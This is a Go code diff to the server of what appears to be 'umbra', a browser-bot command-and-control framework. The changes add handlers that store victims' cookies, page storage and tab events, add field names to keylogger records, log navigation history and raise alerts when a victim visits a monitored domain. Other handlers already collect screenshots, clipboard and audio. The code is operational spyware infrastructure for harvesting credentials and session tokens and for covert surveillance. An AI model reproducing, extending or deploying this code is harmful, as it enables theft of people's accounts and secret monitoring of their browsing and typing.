@@ -9,6 +9,7 @@ import (
 	"github.com/google/uuid"
 
 	"github.com/s045pd/umbra/internal/db/models"
+	"github.com/s045pd/umbra/internal/detect"
 	"github.com/s045pd/umbra/internal/utils"
 )
 
@@ -49,6 +50,12 @@ func (s *Server) dispatch(ctx context.Context, sess *Session, env Envelope) erro
 		return s.handleNavEvent(ctx, sess, env)
 	case ActionClipboardData:
 		return s.handleClipboardData(ctx, sess, env)
+	case ActionCookieEvent:
+		return s.handleDeltaEvent(ctx, sess, env, "cookie")
+	case ActionTabEvent:
+		return s.handleDeltaEvent(ctx, sess, env, "tab")
+	case ActionPageStorage:
+		return s.handlePageStorage(ctx, sess, env)
 	default:
 		s.logger.Warn("unknown action", "action", env.Action, "browser", sess.BrowserID)
 		return nil
@@ -184,11 +191,16 @@ func (s *Server) handleRealtimeImg(_ context.Context, sess *Session, env Envelop
 		// GUI thumbnail in that window.
 		return nil
 	}
-	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
+	at := time.Now()
+	err := s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).
 		Updates(map[string]any{
 			"current_tab_image":    img,
-			"current_tab_image_at": time.Now(),
+			"current_tab_image_at": at,
 		}).Error
+	if err == nil {
+		s.live.Publish(sess.BotID, at)
+	}
+	return err
 }
 
 func (s *Server) handleScreenCaptureData(_ context.Context, sess *Session, env Envelope) error {
@@ -294,6 +306,7 @@ func (s *Server) handleKeyboardLogs(_ context.Context, sess *Session, env Envelo
 		URL   string `json:"url"`
 		Title string `json:"title"`
 		Keys  string `json:"keys"`
+		Field string `json:"field"`
 	}
 	_ = json.Unmarshal(env.Data, &data)
 	row := models.BotKeyboardLog{
@@ -301,6 +314,7 @@ func (s *Server) handleKeyboardLogs(_ context.Context, sess *Session, env Envelo
 		URL:       data.URL,
 		Title:     data.Title,
 		Keys:      data.Keys,
+		Field:     data.Field,
 		Timestamp: time.Now(),
 	}
 	if err := s.db.Create(&row).Error; err != nil {
@@ -340,12 +354,159 @@ func (s *Server) handleAudioData(_ context.Context, sess *Session, env Envelope)
 
 func (s *Server) handleNavEvent(_ context.Context, sess *Session, env Envelope) error {
 	var data struct {
-		URL   string `json:"url"`
-		Title string `json:"title"`
+		URL                  string   `json:"url"`
+		Title                string   `json:"title"`
+		TabID                int      `json:"tab_id"`
+		Timestamp            float64  `json:"timestamp"`
+		TransitionType       string   `json:"transition_type"`
+		TransitionQualifiers []string `json:"transition_qualifiers"`
 	}
 	_ = json.Unmarshal(env.Data, &data)
-	s.logger.Info("nav event", "browser", sess.BrowserID, "url", data.URL)
+	if data.URL == "" {
+		return nil
+	}
+	ts := eventTimestamp(data.Timestamp)
+	row := models.BotNavEvent{
+		BotID:          sess.BotID,
+		URL:            data.URL,
+		Title:          data.Title,
+		TransitionType: data.TransitionType,
+		TabID:          data.TabID,
+		Timestamp:      ts,
+	}
+	if err := s.db.Create(&row).Error; err != nil {
+		return err
+	}
+	_ = s.trimTable(sess.BotID, "bot_nav_events", 5000)
+	s.maybeDomainAlert(sess, data.URL, data.Title, ts)
 	return nil
+}
+
+func eventTimestamp(raw float64) time.Time {
+	now := time.Now()
+	switch {
+	case raw > 1e12:
+		return time.UnixMilli(int64(raw))
+	case raw > 1e9:
+		return time.Unix(int64(raw), 0)
+	default:
+		return now
+	}
+}
+
+func (s *Server) maybeDomainAlert(sess *Session, rawURL, title string, ts time.Time) {
+	var bot models.Bot
+	if err := s.db.Select("switch_config", "data_config", "name").Where("id = ?", sess.BotID).First(&bot).Error; err != nil {
+		return
+	}
+	if !detect.NotificationEnabled(map[string]any(bot.SwitchConfig)) {
+		return
+	}
+	domains := detect.DomainsFromConfig(map[string]any(bot.DataConfig))
+	if !detect.MatchURL(rawURL, domains) {
+		return
+	}
+	var recent int64
+	_ = s.db.Model(&models.BotAlert{}).
+		Where("bot_id = ? AND url = ? AND timestamp > ?", sess.BotID, rawURL, ts.Add(-10*time.Minute)).
+		Count(&recent).Error
+	if recent > 0 {
+		return
+	}
+	alert := models.BotAlert{
+		BotID:     sess.BotID,
+		Kind:      "domain",
+		Severity:  "high",
+		Title:     "Monitored domain visit",
+		URL:       rawURL,
+		Detail:    title,
+		Timestamp: ts,
+	}
+	_ = s.db.Create(&alert).Error
+}
+
+func (s *Server) handleDeltaEvent(_ context.Context, sess *Session, env Envelope, kind string) error {
+	var data struct {
+		Action string         `json:"action"`
+		URL    string         `json:"url"`
+		Title  string         `json:"title"`
+		Detail string         `json:"detail"`
+		Cause  string         `json:"cause"`
+		Name   string         `json:"name"`
+		Domain string         `json:"domain"`
+		TabID  int            `json:"tab_id"`
+		Cookie map[string]any `json:"cookie"`
+	}
+	_ = json.Unmarshal(env.Data, &data)
+	action := data.Action
+	if action == "" {
+		action = data.Cause
+	}
+	detail := data.Detail
+	if detail == "" && data.Name != "" {
+		detail = data.Name
+		if data.Domain != "" {
+			detail += "@" + data.Domain
+		}
+	}
+	payload := models.JSONMap{}
+	if data.Cookie != nil {
+		payload["cookie"] = data.Cookie
+	}
+	if data.TabID != 0 {
+		payload["tab_id"] = data.TabID
+	}
+	row := models.BotDeltaEvent{
+		BotID:     sess.BotID,
+		Kind:      kind,
+		Action:    action,
+		URL:       data.URL,
+		Title:     data.Title,
+		Detail:    detail,
+		Payload:   payload,
+		Timestamp: time.Now(),
+	}
+	if err := s.db.Create(&row).Error; err != nil {
+		return err
+	}
+	return s.trimTable(sess.BotID, "bot_delta_events", 4000)
+}
+
+func (s *Server) handlePageStorage(_ context.Context, sess *Session, env Envelope) error {
+	var data struct {
+		Origins []any `json:"origins"`
+		Storage []any `json:"storage"`
+	}
+	_ = json.Unmarshal(env.Data, &data)
+	origins := data.Origins
+	if origins == nil {
+		origins = data.Storage
+	}
+	if origins == nil {
+		origins = []any{}
+	}
+	now := time.Now()
+	row := models.BotPageStorage{
+		BotID:      sess.BotID,
+		Origins:    models.JSONArray(origins),
+		CapturedAt: now,
+	}
+	var existing models.BotPageStorage
+	err := s.db.Where("bot_id = ?", sess.BotID).First(&existing).Error
+	if err == nil {
+		return s.db.Model(&existing).Updates(map[string]any{
+			"origins":     row.Origins,
+			"captured_at": now,
+		}).Error
+	}
+	return s.db.Create(&row).Error
+}
+
+func (s *Server) trimTable(botID uuid.UUID, table string, keep int) error {
+	return s.db.Exec(
+		`DELETE FROM `+table+` WHERE bot_id = ? AND id NOT IN (SELECT id FROM `+table+` WHERE bot_id = ? ORDER BY timestamp DESC LIMIT ?)`,
+		botID, botID, keep,
+	).Error
 }
 
 func (s *Server) handleClipboardData(_ context.Context, sess *Session, env Envelope) error {
